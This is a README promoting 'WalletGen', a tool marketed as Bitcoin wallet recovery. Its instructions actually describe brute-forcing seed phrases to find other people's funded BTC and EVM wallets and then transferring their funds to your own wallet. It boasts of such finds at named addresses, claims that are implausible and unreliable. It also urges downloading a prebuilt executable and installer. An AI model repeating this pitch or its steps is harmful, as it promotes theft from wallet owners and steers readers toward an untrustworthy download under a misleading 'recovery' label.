# WalletGen - Your Solution for Bitcoin Address Recovery

If you're searching for a reliable way to handle **Bitcoin address recovery**, look no further than **WalletGen**.  This powerful, open-source tool provides a high-speed, efficient approach to help you find and potentially recover access to your lost or inactive Bitcoin (BTC) and other cryptocurrency wallets.  Leverage the power of WalletGen to increase your chances of retrieving your digital assets.

<!--
Meta description:
Lost your Bitcoin address? WalletGen is a high-speed, open-source solution for Bitcoin address recovery. Recover your Bitcoin, and other crypto, today.
-->

## Quick Navigation
- [How It Works](#how-it-works)
- [Why WalletGen](#why-walletgen)
- [Features](#features)
- [Download WalletGen](#how-to-start)
- [Database Download](#download-and-use-database-for-more-speed)
- [The Program Found a Wallet - What Next?](#the-program-found-a-wallet--whats-next)
- [Recovery Your Bitcoin Wallet](#recovery-your-bitcoin-wallet)
- [My Finds](#my-finds)
- [FAQ](#-frequently-asked-questions-faq)
- [Build Instructions](#building-the-project)
- [Donate](#donate)

[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Android-blue)](https://github.com/tony-dev1/wallets-finder/releases/tag/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)
![discord](https://img.shields.io/badge/discord-tonydevbtc-blue.svg?logo=discord&label=discord)
[![x](https://img.shields.io/badge/@tonydevbtc-black.svg?logo=x)](https://x.com/tonydevbtc)

<p align="center">
    <img width="1000" alt="Bitcoin address recovery" title="WalletGen - Bitcoin Address Recovery" height="460" src="/img/piece.webp" />
</p>

⚠️ **Disclaimer**: WalletGen is a research and educational tool. It is not intended for unauthorized access or malicious activity. Use it responsibly and only with wallets you own or have permission to access.

## How It Works

WalletGen utilizes cryptographic standards such as [BIP39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki), [BIP44](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki), and [Bech32](https://en.bitcoin.it/wiki/Bech32) for generating potential Bitcoin addresses. The tool is also capable of working with Ethereum and other EVM-compatible blockchains using [Keccak256](https://emn178.github.io/online-tools/keccak_256.html) hashing.

The software then compares the generated addresses against known address databases or, in other cases, checks balances in real-time through public blockchain explorers. This method is designed to help you identify the correct Bitcoin address associated with your funds.

Wallet Gen is written in C++ and is open-source. Its open nature allows access and modification of the code. Compared to tools built in Python, Wallet Gen offers substantially higher wallet generation speeds. It uses the power of your CPU and GPU.

##  Why WalletGen?

For a fast and efficient solution for **Bitcoin address recovery**, rely on **WalletGen**.  Engineered in C++ and optimized for multi-threaded CPU and GPU usage, WalletGen's performance is significantly greater (up to **10x faster**) than alternative brute-force tools. If you're exploring lost wallets, verifying seed phrases, or trying to recover your own Bitcoin, WalletGen provides the power and speed necessary.

## Features

-   **Generate Cryptocurrency Wallets:** Quickly generate wallets for Bitcoin, Ethereum, BNB, MATIC, and other cryptocurrencies.
-   **Brute Force Search with Balance:** Use brute-force methods to locate wallets with balances, including both Bitcoin and EVM networks.
-   **Extensive Algorithm Support:** Supports Keccak256 for EVM wallets and BIP39, BIP44, Bech32 algorithms for Bitcoin.
-   **Database for Speed:** Download and utilize databases to speed up the address-finding process.
-   **High-Speed Operation:** Designed to take advantage of your CPU and GPU for maximum performance.
-   **Bitcoin Wallet Recovery (Seed Phrase):** WalletGen gives you the option to recover your bitcoin wallet by seed phrase (mnemonic phrase).

## Supported Blockchains

-   Bitcoin (BTC)
-   Ethereum (ETH)
-   Binance Smart Chain (BNB)
-   Any EVM-compatible chain

# Demo

<p align="center">
    <img width="1000" height="460" alt="Bitcoin address recovery demo" title="WalletGen - Bitcoin Address Recovery Demo" src="/img/normal.webp" />
</p>

<p align="center">
    <img width="1000" height="460" alt="Bitcoin address recovery demo on Linux" title="WalletGen Bitcoin Address Recovery on Linux" src="/img/reveal.webp" />
</p>

# How to start

## Windows 
- Download [Release](../../releases) 
- Unpack anywhere
- Run `WalletGen.exe`

Or Just Download [Installer](../../releases)

## Linux (x86-64bit)

Use wget 
or download [Release for Linux](../../releases) 







## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** provides brute-force search methods for finding crypto wallets with balances.

### For Bitcoin (BTC) wallets:

*   Choose option 3 in the menu or run start_search_btc.bat to search Bitcoin wallets via the internet. Note that this method may take longer, since it relies on real-time balance checks.
*   Choose option 6 to search Bitcoin wallets using the database. This approach enables faster results because it compares generated wallets against a pre-built database of known addresses with balances.

### For EVM wallets (Ethereum, BNB, MATIC, etc.):

*   Choose option 5 or run start_search_evm.bat to search EVM wallets over the internet. This verifies balances in real-time.
*   Choose option 6 to search for EVM wallets using the database. This is a more efficient approach, as it compares generated wallets against a database of known balances.

### Speed Considerations:

*   The speed of the search is heavily dependent on your hardware, particularly the GPU. Running multiple program instances (1 to 4) can maximize speed.

## The Program Found a Wallet — What’s Next?

When the program finds a wallet with a balance:
*   The search will immediately halt.
*   The wallet details will be displayed in the console.
*   This information is saved in the ``found_wallets.txt`` file.

### How to Access the Funds?
1.  Import the **mnemonic seed phrase** from the located wallet into any compatible crypto wallet.
2.  You’ll be able to transfer the funds to your own secure wallet.

## Recovery Your Bitcoin Wallet

WalletGen enables you to recover your Bitcoin wallet via the seed phrase (mnemonic phrase). The program supports entering a complete seed phrase, or searching for missing words.

### Process Description

#### Search for missing words:

If the seed phrase is missing words, use * as a placeholder.

#### Entering a complete seed-phrase:

Enter the full 12-word seed to generate all address types (Legacy, SegWit, P2SH).

![recovery](/img/find.webp)

### Important recommendations

*   Seed-phrase must contain exactly 12 words.
*   Use only the * symbol to search for missing words.
*   Searching for missing words may take considerable time.
*   Successful recovery stops the program and saves the data.

## My Finds

![mywallet](/img/zoom.webp)

I’ve recovered two BTC wallets with a balance. The first had 0.000032 BTC, the second contained 0.0528 BTC (roughly $4800 at the time of discovery).
Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay).

<p align="center">
    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="/img/element.webp" />
</p>

### New Find 4/9/2025

After a week of non-stop wallet searching, I finally found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my 4th and biggest find of all time.

![image](/img/progress.webp)

## New Find 5/5/2025

[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)

![image](/img/area.webp)

## Building the Project

1. Open the project file (`CryptoWalletGen.sln`) in Visual Studio or any compatible C++ compiler.
2. Install the necessary dependencies and build the project.

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.bat
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```

3. Start building the project.

## 🔍 Frequently Asked Questions (FAQ)

### ❓ Where can I download WalletGen?
You can download the WalletGen given on the [release download page](../../releases) 

### ❓ Where can I download a database of known addresses with balance?
You can download the current database given on the [release   page](../../releases) 

### ❓ Can WalletGen help me recover a lost Bitcoin wallet?
Yes. WalletGen uses brute-force seed generation and a known-address database to help users potentially **recover lost Bitcoin wallets**.

### ❓ Is WalletGen a seed phrase generator?
Yes. WalletGen can generate **BIP39 seed phrases** and derive wallets for Bitcoin, Ethereum, and other EVM chains.

### ❓ Do I need the internet to search through the database?
No. Searching through the database does not require an internet connection, as the wallet balance is already known.

### ❓ Can I find Ethereum wallets with balance?
Yes. WalletGen supports scanning for **Ethereum wallets with balance** using brute-force and a database of known addresses.

### ❓ Is WalletGen legal?
WalletGen is intended for **educational and research purposes only**. It should only be used on wallets you own or have permission to access.

## Todo
1. Search for missing words in a seed phrase. - **Done!**

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.

## Donate

If you find a wallet with a balance, please consider donating a small portion as a thank you. This motivates me to keep working on the program!

**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9

**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693

## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License
This project is licensed under the [MIT License](/LICENSE)